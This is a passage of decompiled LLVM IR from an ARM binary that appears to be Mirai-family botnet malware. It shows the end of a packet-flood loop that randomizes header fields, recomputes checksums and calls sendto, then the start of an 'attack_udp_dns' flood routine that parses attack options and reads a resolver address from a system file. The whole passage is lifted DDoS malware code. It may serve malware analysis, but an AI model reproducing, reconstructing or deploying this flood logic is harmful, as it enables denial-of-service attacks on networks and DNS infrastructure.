dec_label_pc_b748:                                ; preds = %dec_label_pc_b810.dec_label_pc_b748_crit_edge, %dec_label_pc_b73c
  %v1_b74c = phi i32 [ %v1_b74c.pre, %dec_label_pc_b810.dec_label_pc_b748_crit_edge ], [ 65535, %dec_label_pc_b73c ]
  store i32 %v3_b5d8, i32* %r2.global-to-local, align 4
  %v9_b74c = icmp eq i32 %v3_b5d8, %v1_b74c
  br i1 %v9_b74c, label %dec_label_pc_b884, label %dec_label_pc_b754

dec_label_pc_b754:                                ; preds = %dec_label_pc_b870.dec_label_pc_b754_crit_edge, %dec_label_pc_b748
  %v1_b758 = phi i32 [ %v1_b758.pre, %dec_label_pc_b870.dec_label_pc_b754_crit_edge ], [ %v1_b74c, %dec_label_pc_b748 ]
  store i32 %v3_b5dc, i32* %r3.global-to-local, align 4
  %v9_b758 = icmp eq i32 %v3_b5dc, %v1_b758
  br i1 %v9_b758, label %dec_label_pc_b898, label %dec_label_pc_b760

dec_label_pc_b760:                                ; preds = %dec_label_pc_b884, %dec_label_pc_b754, %dec_label_pc_b898
  store i32 0, i32* @r4, align 4
  %v2_b768 = load i32, i32* @r5, align 4
  %v3_b768 = add i32 %v2_b768, 10
  %v4_b768 = inttoptr i32 %v3_b768 to i16*
  store i16 0, i16* %v4_b768, align 2
  %v0_b76c = load i32, i32* @r5, align 4
  store i32 %v0_b76c, i32* @r0, align 4
  %v2_b770 = call i32 @checksum_generic(i32 %v0_b76c, i32 20)
  %v3_b770 = trunc i32 %v2_b770 to i16
  %v3_b774 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_b774, i32* %r3.global-to-local, align 4
  %v3_b778 = load i32, i32* @r5, align 4
  %v4_b778 = add i32 %v3_b778, 10
  %v5_b778 = inttoptr i32 %v4_b778 to i16*
  store i16 %v3_b770, i16* %v5_b778, align 2
  %v0_b77c = load i32, i32* @r6, align 4
  store i32 %v0_b77c, i32* @r1, align 4
  %v1_b780 = add i32 %v0_b77c, 4
  %v2_b780 = inttoptr i32 %v1_b780 to i16*
  %v3_b780 = load i16, i16* %v2_b780, align 2
  %v4_b780 = zext i16 %v3_b780 to i32
  store i32 %v4_b780, i32* %r2.global-to-local, align 4
  %v0_b784 = load i32, i32* @r4, align 4
  %v1_b784 = trunc i32 %v0_b784 to i16
  %v3_b784 = add i32 %v0_b77c, 6
  %v4_b784 = inttoptr i32 %v3_b784 to i16*
  store i16 %v1_b784, i16* %v4_b784, align 2
  %v0_b788 = load i32, i32* %r3.global-to-local, align 4
  %v1_b788 = add i32 %v0_b788, 12
  store i32 %v1_b788, i32* %r3.global-to-local, align 4
  %v0_b78c = load i32, i32* @r5, align 4
  %v4_b790 = call i32 @checksum_tcpudp(i32 %v0_b78c, i32 %v0_b77c, i32 %v4_b780, i32 %v1_b788)
  %v5_b790 = trunc i32 %v4_b790 to i16
  %v3_b794 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b794, i32* %r3.global-to-local, align 4
  %v3_b798 = mul i32 %v3_b794, 32
  store i32 %v3_b798, i32* %lr.global-to-local, align 4
  %v3_b79c = load i32, i32* @r6, align 4
  %v4_b79c = add i32 %v3_b79c, 6
  %v5_b79c = inttoptr i32 %v4_b79c to i16*
  store i16 %v5_b790, i16* %v5_b79c, align 2
  %v0_b7a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_b7a0 = load i32, i32* %r3.global-to-local, align 4
  %tmp44 = mul i32 %v1_b7a0, -8
  %v5_b7a0 = add i32 %v0_b7a0, %tmp44
  store i32 %v5_b7a0, i32* %lr.global-to-local, align 4
  %v0_b7a4 = load i32, i32* @r6, align 4
  %v1_b7a4 = add i32 %v0_b7a4, 2
  %v2_b7a4 = inttoptr i32 %v1_b7a4 to i16*
  %v3_b7a4 = load i16, i16* %v2_b7a4, align 2
  %v4_b7a4 = zext i16 %v3_b7a4 to i32
  store i32 %v4_b7a4, i32* @r6, align 4
  %v3_b7a8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_b7a8, i32* %r2.global-to-local, align 4
  %v1_b7ac = load i32, i32* @r8, align 4
  %v2_b7ac = add i32 %v1_b7ac, %v5_b7a0
  store i32 %v2_b7ac, i32* @lr, align 4
  %v3_b7b0 = add i32 %v2_b7ac, 2
  %v4_b7b0 = inttoptr i32 %v3_b7b0 to i16*
  store i16 %v3_b7a4, i16* %v4_b7b0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b7bc = load i32, i32* @r5, align 4
  %v0_b7c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b7c0 = add i32 %v0_b7c0, 32
  store i32 %v1_b7c0, i32* %r2.global-to-local, align 4
  %v0_b7c4 = load i32, i32* @sl, align 4
  %v0_b7c8 = load i32, i32* @lr, align 4
  %v6_b7d0 = call i32 @__libc_sendto(i32 %v0_b7c4, i32 %v0_b7bc, i32 %v1_b7c0, i32 16384, i32 %v0_b7c8, i32 16)
  %v3_b7d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b7d4, i32* %r3.global-to-local, align 4
  %v1_b7d8 = add i32 %v3_b7d4, 1
  %v1_b7dc = load i32, i32* @fp, align 4
  store i32 %v1_b7d8, i32* %stack_var_-44, align 4
  %v6_b7e4 = icmp slt i32 %v1_b7d8, %v1_b7dc
  br i1 %v6_b7e4, label %dec_label_pc_b7e8, label %dec_label_pc_b8a4

dec_label_pc_b7e8:                                ; preds = %dec_label_pc_b760, %dec_label_pc_b734
  %v1_b7f8 = phi i32 [ %v1_b7d8, %dec_label_pc_b760 ], [ 0, %dec_label_pc_b734 ]
  %v5_b7ec = mul i32 %v1_b7f8, 24
  %v1_b7f0 = load i32, i32* @r8, align 4
  %v2_b7f0 = add i32 %v1_b7f0, %v5_b7ec
  store i32 %v2_b7f0, i32* %r3.global-to-local, align 4
  %v1_b7f4 = add i32 %v2_b7f0, 20
  %v2_b7f4 = inttoptr i32 %v1_b7f4 to i8*
  %v3_b7f4 = load i8, i8* %v2_b7f4, align 1
  %v4_b7f4 = zext i8 %v3_b7f4 to i32
  store i32 %v4_b7f4, i32* %r2.global-to-local, align 4
  %v0_b7f8 = load i32, i32* @sb, align 4
  %v4_b7f8 = mul i32 %v1_b7f8, 4
  %v5_b7f8 = add i32 %v0_b7f8, %v4_b7f8
  %v6_b7f8 = inttoptr i32 %v5_b7f8 to i32*
  %v7_b7f8 = load i32, i32* %v6_b7f8, align 4
  store i32 %v7_b7f8, i32* @r5, align 4
  store i32 65535, i32* @r7, align 4
  %v1_b808 = add i32 %v7_b7f8, 20
  store i32 %v1_b808, i32* @r6, align 4
  %tmp45 = icmp ugt i8 %v3_b7f4, 31
  br i1 %tmp45, label %dec_label_pc_b73c, label %dec_label_pc_b810

dec_label_pc_b810:                                ; preds = %dec_label_pc_b7e8
  %v1_b810 = add i32 %v2_b7f0, 16
  %v2_b810 = inttoptr i32 %v1_b810 to i32*
  %v3_b810 = load i32, i32* %v2_b810, align 4
  store i32 %v3_b810, i32* %r4.global-to-local, align 4
  %v0_b814 = call i32 @rand_next()
  %v3_b818 = load i32, i32* %stack_var_-44, align 4
  %v5_b820 = mul i32 %v3_b818, 24
  %v1_b824 = and i32 %v3_b810, 16711680
  store i32 %v1_b824, i32* %ip.global-to-local, align 4
  %v3_b828 = udiv i32 %v3_b810, 16777216
  %v4_b82c = udiv i32 %v1_b824, 256
  %v5_b82c = or i32 %v4_b82c, %v3_b828
  store i32 %v5_b82c, i32* %r2.global-to-local, align 4
  %v1_b830 = load i32, i32* @r8, align 4
  %v2_b830 = add i32 %v1_b830, %v5_b820
  %v1_b834 = and i32 %v3_b810, ptrtoint (i32* @global_var_ff00.28 to i32)
  store i32 %v1_b834, i32* %r3.global-to-local, align 4
  %v1_b838 = add i32 %v2_b830, 20
  %v2_b838 = inttoptr i32 %v1_b838 to i8*
  %v3_b838 = load i8, i8* %v2_b838, align 1
  %v4_b838 = zext i8 %v3_b838 to i32
  store i32 %v4_b838, i32* %ip.global-to-local, align 4
  %v4_b83c = mul i32 %v1_b834, 256
  %v4_b840 = mul i32 %v3_b810, 16777216
  %v5_b83c = or i32 %v4_b83c, %v4_b840
  %v5_b840 = or i32 %v5_b83c, %v5_b82c
  %v7_b844 = lshr i32 %v0_b814, %v4_b838
  %v8_b844 = add i32 %v7_b844, %v5_b840
  store i32 %v8_b844, i32* %r2.global-to-local, align 4
  %v5_b860 = call i32 @llvm.bswap.i32(i32 %v8_b844)
  store i32 %v5_b860, i32* %r3.global-to-local, align 4
  %v1_b864 = load i32, i32* @r7, align 4
  %v9_b864 = icmp eq i32 %v3_b5d4, %v1_b864
  %v1_b868 = load i32, i32* @r5, align 4
  %v2_b868 = add i32 %v1_b868, 16
  %v3_b868 = inttoptr i32 %v2_b868 to i32*
  store i32 %v5_b860, i32* %v3_b868, align 4
  br i1 %v9_b864, label %dec_label_pc_b870, label %dec_label_pc_b810.dec_label_pc_b748_crit_edge

dec_label_pc_b810.dec_label_pc_b748_crit_edge:    ; preds = %dec_label_pc_b810
  %v1_b74c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b748

dec_label_pc_b870:                                ; preds = %dec_label_pc_b810, %dec_label_pc_b73c
  %v0_b870 = call i32 @rand_next()
  %v1_b870 = trunc i32 %v0_b870 to i16
  store i32 %v3_b5d8, i32* %r2.global-to-local, align 4
  %v1_b878 = load i32, i32* @r7, align 4
  %v9_b878 = icmp eq i32 %v3_b5d8, %v1_b878
  %v3_b87c = load i32, i32* @r5, align 4
  %v4_b87c = add i32 %v3_b87c, 4
  %v5_b87c = inttoptr i32 %v4_b87c to i16*
  store i16 %v1_b870, i16* %v5_b87c, align 2
  br i1 %v9_b878, label %dec_label_pc_b884, label %dec_label_pc_b870.dec_label_pc_b754_crit_edge

dec_label_pc_b870.dec_label_pc_b754_crit_edge:    ; preds = %dec_label_pc_b870
  %v1_b758.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b754

dec_label_pc_b884:                                ; preds = %dec_label_pc_b870, %dec_label_pc_b748
  %v0_b884 = call i32 @rand_next()
  %v1_b884 = trunc i32 %v0_b884 to i16
  store i32 %v3_b5dc, i32* %r3.global-to-local, align 4
  %v1_b88c = load i32, i32* @r7, align 4
  %v9_b88c = icmp eq i32 %v3_b5dc, %v1_b88c
  %v3_b890 = load i32, i32* @r5, align 4
  %v4_b890 = add i32 %v3_b890, 20
  %v5_b890 = inttoptr i32 %v4_b890 to i16*
  store i16 %v1_b884, i16* %v5_b890, align 2
  br i1 %v9_b88c, label %dec_label_pc_b898, label %dec_label_pc_b760

dec_label_pc_b898:                                ; preds = %dec_label_pc_b884, %dec_label_pc_b754
  %v0_b898 = call i32 @rand_next()
  %v1_b898 = trunc i32 %v0_b898 to i16
  %v3_b89c = load i32, i32* @r6, align 4
  %v4_b89c = add i32 %v3_b89c, 2
  %v5_b89c = inttoptr i32 %v4_b89c to i16*
  store i16 %v1_b898, i16* %v5_b89c, align 2
  br label %dec_label_pc_b760

dec_label_pc_b8a4:                                ; preds = %dec_label_pc_b760, %dec_label_pc_b724
  %v2_b8a8 = call i32 @__GI_time(i32* null)
  store i32 %v2_b55c, i32* %ip.global-to-local, align 4
  %v6_b8b4 = icmp slt i32 %v2_b55c, %v2_b8a8
  br i1 %v6_b8b4, label %dec_label_pc_b8b8, label %dec_label_pc_b8a4.dec_label_pc_b724_crit_edge

dec_label_pc_b8a4.dec_label_pc_b724_crit_edge:    ; preds = %dec_label_pc_b8a4
  %v0_b728.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_b724

dec_label_pc_b8b8:                                ; preds = %dec_label_pc_b8a4, %entry, %dec_label_pc_b8c4
  %v1_b8c0 = phi i32 [ %v3_b588, %entry ], [ %v1_b8c8, %dec_label_pc_b8c4 ], [ %v2_b8a8, %dec_label_pc_b8a4 ]
  store i32 %v3_b468, i32* %r4.global-to-local, align 4
  store i32 %v27_b468, i32* %lr.global-to-local, align 4
  ret i32 %v1_b8c0

dec_label_pc_b8c4:                                ; preds = %dec_label_pc_b598
  %v0_b8c4 = load i32, i32* @sl, align 4
  %v1_b8c8 = call i32 @__GI___libc_close(i32 %v0_b8c4)
  br label %dec_label_pc_b8b8

; uselistorder directives
  uselistorder i32 %v5_b860, { 1, 0 }
  uselistorder i32 %v3_b810, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_b7d8, { 1, 2, 0 }
  uselistorder i32 %v5_b7a0, { 1, 0 }
  uselistorder i32 %v0_b77c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_b714, { 1, 0, 2 }
  uselistorder i32 %v3_b678, { 1, 0 }
  uselistorder i32 %v0_b63c, { 1, 2, 0 }
  uselistorder i32 %v3_b614, { 1, 0 }
  uselistorder i32 %v3_b5d4, { 0, 2, 1 }
  uselistorder i32 %v0_b5cc, { 1, 0, 2 }
  uselistorder i32 %v3_b588, { 1, 2, 3, 0 }
  uselistorder i32 %v2_b55c, { 1, 0 }
  uselistorder i32 %v6_b52c, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v1_b514, { 1, 2, 0 }
  uselistorder i32 %v5_b508, { 1, 0 }
  uselistorder i32 %v7_b4d0, { 1, 0, 2, 3 }
  uselistorder i32 %v6_b4ac, { 1, 2, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 12, 4, 5, 6, 7, 8, 9, 10, 11, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder label %dec_label_pc_b8b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b760, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b724, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_b8d4 = load i32, i32* @sb, align 4
  %v27_b8d4 = load i32, i32* @lr, align 4
  store i32 0, i32* @sl, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_b904 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_b908 = load i32, i32* @r4, align 4
  store i32 %v0_b908, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_b914 = load i32, i32* @sl, align 4
  store i32 %v0_b914, i32* %r3.global-to-local, align 4
  %v0_b918 = load i32, i32* @r5, align 4
  store i32 %v0_b918, i32* %r0.global-to-local, align 4
  %v5_b91c = inttoptr i32 %v0_b908 to i32*
  %v6_b91c = call i32 @attack_get_opt_int(i32 %v0_b918, i32* %v5_b91c, i32 2, i32 %v0_b914, i32 %v2_b904)
  %v1_b928 = urem i32 %v6_b91c, 256
  store i32 %v1_b928, i32* %ip.global-to-local, align 4
  %v0_b92c = load i32, i32* @r4, align 4
  store i32 %v0_b92c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b938 = load i32, i32* @r5, align 4
  store i32 %v0_b938, i32* %r0.global-to-local, align 4
  %v6_b940 = inttoptr i32 %v0_b92c to i32*
  %v7_b940 = call i32 @attack_get_opt_int(i32 %v0_b938, i32* %v6_b940, i32 3, i32 65535, i32 %v1_b928)
  %v0_b944 = load i32, i32* @r4, align 4
  store i32 %v0_b944, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_b954 = load i32, i32* @r5, align 4
  store i32 %v0_b954, i32* %r0.global-to-local, align 4
  %v5_b958 = inttoptr i32 %v0_b944 to i32*
  %v6_b958 = call i32 @attack_get_opt_int(i32 %v0_b954, i32* %v5_b958, i32 4, i32 64, i32 %v7_b940)
  %v0_b960 = load i32, i32* @r4, align 4
  store i32 %v0_b960, i32* %r1.global-to-local, align 4
  %v1_b964 = urem i32 %v6_b958, 256
  store i32 %v1_b964, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_b96c = load i32, i32* @sl, align 4
  store i32 %v0_b96c, i32* %r3.global-to-local, align 4
  %v0_b970 = load i32, i32* @r5, align 4
  store i32 %v0_b970, i32* %r0.global-to-local, align 4
  %sext21 = mul i32 %v6_b958, 16777216
  %v5_b978 = sdiv i32 %sext21, 16777216
  %v6_b978 = inttoptr i32 %v0_b960 to i32*
  %v7_b978 = call i32 @attack_get_opt_int(i32 %v0_b970, i32* %v6_b978, i32 5, i32 %v0_b96c, i32 %v5_b978)
  %v1_b984 = urem i32 %v7_b978, 256
  store i32 %v1_b984, i32* %ip.global-to-local, align 4
  %v0_b988 = load i32, i32* @r4, align 4
  store i32 %v0_b988, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b994 = load i32, i32* @r5, align 4
  store i32 %v0_b994, i32* %r0.global-to-local, align 4
  %v5_b99c = inttoptr i32 %v0_b988 to i32*
  %v6_b99c = call i32 @attack_get_opt_int(i32 %v0_b994, i32* %v5_b99c, i32 6, i32 65535, i32 %v1_b984)
  %v0_b9a0 = load i32, i32* @r4, align 4
  store i32 %v0_b9a0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v0_b9b0 = load i32, i32* @r5, align 4
  store i32 %v0_b9b0, i32* %r0.global-to-local, align 4
  %v5_b9b4 = inttoptr i32 %v0_b9a0 to i32*
  %v6_b9b4 = call i32 @attack_get_opt_int(i32 %v0_b9b0, i32* %v5_b9b4, i32 7, i32 53, i32 %v6_b99c)
  %v0_b9bc = load i32, i32* @r4, align 4
  store i32 %v0_b9bc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v0_b9cc = load i32, i32* @r5, align 4
  store i32 %v0_b9cc, i32* %r0.global-to-local, align 4
  %v5_b9d0 = inttoptr i32 %v0_b9bc to i32*
  %v6_b9d0 = call i32 @attack_get_opt_int(i32 %v0_b9cc, i32* %v5_b9d0, i32 9, i32 65535, i32 %v6_b9b4)
  %v0_b9d4 = load i32, i32* @r4, align 4
  store i32 %v0_b9d4, i32* %r1.global-to-local, align 4
  %v0_b9dc = load i32, i32* @sl, align 4
  store i32 %v0_b9dc, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_b9e4 = load i32, i32* @r5, align 4
  store i32 %v0_b9e4, i32* %r0.global-to-local, align 4
  %v5_b9e8 = inttoptr i32 %v0_b9d4 to i32*
  %v6_b9e8 = call i32 @attack_get_opt_int(i32 %v0_b9e4, i32* %v5_b9e8, i32 %v0_b9dc, i32 12, i32 %v6_b9d0)
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_b9f0 = load i32, i32* @sl, align 4
  store i32 %v0_b9f0, i32* %r3.global-to-local, align 4
  %v0_b9f4 = load i32, i32* @r4, align 4
  store i32 %v0_b9f4, i32* %r1.global-to-local, align 4
  %v0_b9fc = load i32, i32* @r5, align 4
  store i32 %v0_b9fc, i32* %r0.global-to-local, align 4
  %v5_ba00 = inttoptr i32 %v0_b9f4 to i32*
  %v6_ba00 = call i32 @attack_get_opt_str(i32 %v0_b9fc, i32* %v5_ba00, i32 8, i32 %v0_b9f0, i32 %v6_b9e8)
  store i32 %v6_ba00, i32* @r7, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_ba0c = call i32 @table_unlock_val(i32 33)
  %v0_ba10 = load i32, i32* @sl, align 4
  store i32 %v0_ba10, i32* %r1.global-to-local, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v2_ba18 = inttoptr i32 %v0_ba10 to i32*
  %v3_ba18 = call i32 @table_retrieve_val(i32 33, i32* %v2_ba18)
  store i32 %v3_ba18, i32* %r0.global-to-local, align 4
  %v0_ba1c = load i32, i32* @sl, align 4
  store i32 %v0_ba1c, i32* %r1.global-to-local, align 4
  %v2_ba20 = call i32 @__libc_open(i32 %v3_ba18, i32 %v0_ba1c)
  store i32 %v2_ba20, i32* @r4, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_ba2c = call i32 @table_lock_val(i32 33)
  store i32 %v1_ba2c, i32* %r0.global-to-local, align 4
  %v0_ba30 = load i32, i32* @r4, align 4
  %v1_ba30 = load i32, i32* @sl, align 4
  %v9_ba30 = icmp eq i32 %v0_ba30, %v1_ba30
  store i1 %v9_ba30, i1* %cpsr_z.global-to-local, align 1
  %v5_ba34 = icmp slt i32 %v0_ba30, %v1_ba30
  br i1 %v5_ba34, label %dec_label_pc_baf0, label %dec_label_pc_ba38

dec_label_pc_ba38:                                ; preds = %entry
  %v2_ba3c = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_ba3c, i32* %sb.global-to-local, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_ba3c, i32* @r1, align 4
  store i32 %v0_ba30, i32* %r0.global-to-local, align 4
  %v1_ba4c = call i32 @__libc_read(i32 %v0_ba30)
  store i32 %v1_ba4c, i32* @r6, align 4
  %v0_ba54 = load i32, i32* @r4, align 4
  store i32 %v0_ba54, i32* %r0.global-to-local, align 4
  %v1_ba58 = call i32 @__GI___libc_close(i32 %v0_ba54)
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_ba60 = call i32 @table_unlock_val(i32 34)
  %v0_ba64 = load i32, i32* @sl, align 4
  store i32 %v0_ba64, i32* %r1.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v2_ba6c = inttoptr i32 %v0_ba64 to i32*
  %v3_ba6c = call i32 @table_retrieve_val(i32 34, i32* %v2_ba6c)
  %v0_ba70 = load i32, i32* @r6, align 4
  store i32 %v0_ba70, i32* @r1, align 4
  store i32 %v3_ba6c, i32* %r2.global-to-local, align 4
  store i32 %v2_ba3c, i32* %r0.global-to-local, align 4
  %v3_ba7c = bitcast i32* %stack_var_-2124 to i8*
  %v4_ba7c = call i32 @util_stristr(i8* %v3_ba7c, i32 %v0_ba70, i32 %v3_ba6c)
  store i32 %v4_ba7c, i32* @r8, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_ba88 = call i32 @table_lock_val(i32 34)
  store i32 %v1_ba88, i32* %r0.global-to-local, align 4
  %v0_ba8c = load i32, i32* @r8, align 4
  %v7_ba8c = icmp eq i32 %v0_ba8c, -1
  store i1 %v7_ba8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ba8c, label %dec_label_pc_baf0, label %dec_label_pc_ba94

dec_label_pc_ba94:                                ; preds = %dec_label_pc_ba38
  %v0_ba94 = load i32, i32* @r6, align 4
  %v9_ba94 = icmp eq i32 %v0_ba94, %v0_ba8c
  store i1 %v9_ba94, i1* %cpsr_z.global-to-local, align 1
  %v7_ba98 = icmp sgt i32 %v0_ba94, %v0_ba8c
  br i1 %v7_ba98, label %dec_label_pc_ba9c, label %dec_label_pc_baf0

dec_label_pc_ba9c:                                ; preds = %dec_label_pc_ba94
  %v0_ba9c = load i32, i32* @sl, align 4
  store i32 %v0_ba9c, i32* %r1.global-to-local, align 4
  %v0_baa0 = load i32, i32* %sb.global-to-local, align 4
  %v2_baa0 = add i32 %v0_baa0, %v0_ba8c
  store i32 %v2_baa0, i32* %ip.global-to-local, align 4
  %v1_bab0 = add i32 %v0_ba94, -1
  br label %dec_label_pc_baa8

dec_label_pc_baa8:                                ; preds = %dec_label_pc_bae4, %dec_label_pc_ba9c
  %v0_bae4 = phi i32 [ %v1_bae4, %dec_label_pc_bae4 ], [ %v0_ba8c, %dec_label_pc_ba9c ]
  %v0_bacc = phi i32 [ %v0_bacc27, %dec_label_pc_bae4 ], [ %v0_ba9c, %dec_label_pc_ba9c ]
  %v0_baac = phi i32 [ %v0_baac23, %dec_label_pc_bae4 ], [ %v0_ba9c, %dec_label_pc_ba9c ]
  %v0_bab4 = phi i32 [ %v1_bab4, %dec_label_pc_bae4 ], [ %v2_baa0, %dec_label_pc_ba9c ]
  %v1_baa8 = inttoptr i32 %v0_bab4 to i8*
  %v2_baa8 = load i8, i8* %v1_baa8, align 1
  %v3_baa8 = zext i8 %v2_baa8 to i32
  store i32 %v3_baa8, i32* %r0.global-to-local, align 4
  %v2_baac = icmp eq i32 %v0_baac, 0
  store i1 %v2_baac, i1* %cpsr_z.global-to-local, align 1
  %v1_bab4 = add i32 %v0_bab4, 1
  store i32 %v1_bab4, i32* %ip.global-to-local, align 4
  %v1_bab8 = add nsw i32 %v3_baa8, -48
  store i32 %v1_bab8, i32* @lr, align 4
  br i1 %v2_baac, label %dec_label_pc_bac0, label %dec_label_pc_bad0

dec_label_pc_bac0:                                ; preds = %dec_label_pc_baa8
  %v7_bac0 = icmp eq i8 %v2_baa8, 9
  store i1 %v7_bac0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bac0, label %dec_label_pc_bae4, label %bb

bb:                                               ; preds = %dec_label_pc_bac0
  %v8_bac4 = icmp eq i8 %v2_baa8, 32
  store i1 %v8_bac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_bac4, label %dec_label_pc_bae4, label %dec_label_pc_bacc

dec_label_pc_bacc:                                ; preds = %bb
  %v1_bacc = add i32 %v0_bacc, 1
  store i32 %v1_bacc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bad0

dec_label_pc_bad0:                                ; preds = %dec_label_pc_baa8, %dec_label_pc_bacc
  %v0_bacc28 = phi i32 [ %v0_bacc, %dec_label_pc_baa8 ], [ %v1_bacc, %dec_label_pc_bacc ]
  %v0_baac24 = phi i32 [ %v0_baac, %dec_label_pc_baa8 ], [ %v1_bacc, %dec_label_pc_bacc ]
  %v7_bad0 = icmp eq i8 %v2_baa8, 46
  store i1 %v7_bad0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bad0, label %dec_label_pc_badc, label %bb113

bb113:                                            ; preds = %dec_label_pc_bad0
  %v3_bad4 = icmp ugt i32 %v1_bab8, 8
  %v8_bad4 = icmp eq i32 %v1_bab8, 9
  store i1 %v8_bad4, i1* %cpsr_z.global-to-local, align 1
  %v2_bad8 = xor i1 %v8_bad4, true
  %v3_bad8 = and i1 %v3_bad4, %v2_bad8
  br i1 %v3_bad8, label %dec_label_pc_bf44, label %dec_label_pc_badc

dec_label_pc_badc:                                ; preds = %dec_label_pc_bad0, %bb113
  %v9_badc = icmp eq i32 %v1_bab0, %v0_bae4
  store i1 %v9_badc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_badc, label %dec_label_pc_bf44, label %dec_label_pc_bae4

dec_label_pc_bae4:                                ; preds = %dec_label_pc_bac0, %dec_label_pc_badc, %bb
  %v0_bacc27 = phi i32 [ %v0_bacc, %dec_label_pc_bac0 ], [ %v0_bacc28, %dec_label_pc_badc ], [ %v0_bacc, %bb ]
  %v0_baac23 = phi i32 [ 0, %dec_label_pc_bac0 ], [ %v0_baac24, %dec_label_pc_badc ], [ 0, %bb ]
  %v1_bae4 = add i32 %v0_bae4, 1
  store i32 %v1_bae4, i32* @r4, align 4
  %v9_bae8 = icmp eq i32 %v1_bae4, %v0_ba94
  store i1 %v9_bae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bae8, label %dec_label_pc_baf0, label %dec_label_pc_baa8

dec_label_pc_baf0:                                ; preds = %dec_label_pc_bae4, %dec_label_pc_ba94, %dec_label_pc_ba38, %entry
  %v0_baf0 = call i32 @rand_next()
  %v1_baf4 = urem i32 %v0_baf0, 4
  store i32 %v1_baf4, i32* %r0.global-to-local, align 4
  %v2_baf8 = icmp eq i32 %v1_baf4, 3
  store i1 %v2_baf8, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_baf0 to i2
  switch i2 %trunc, label %dec_label_pc_bb248 [
    i2 0, label %dec_label_pc_bf90
    i2 1, label %dec_label_pc_bfa4
    i2 -2, label %dec_label_pc_bf80
    i2 -1, label %dec_label_pc_bb14
  ]

dec_label_pc_bb14:                                ; preds = %dec_label_pc_baf0
  store i32 33686020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_bb24

dec_label_pc_bb248:                               ; preds = %dec_label_pc_baf0
  unreachable

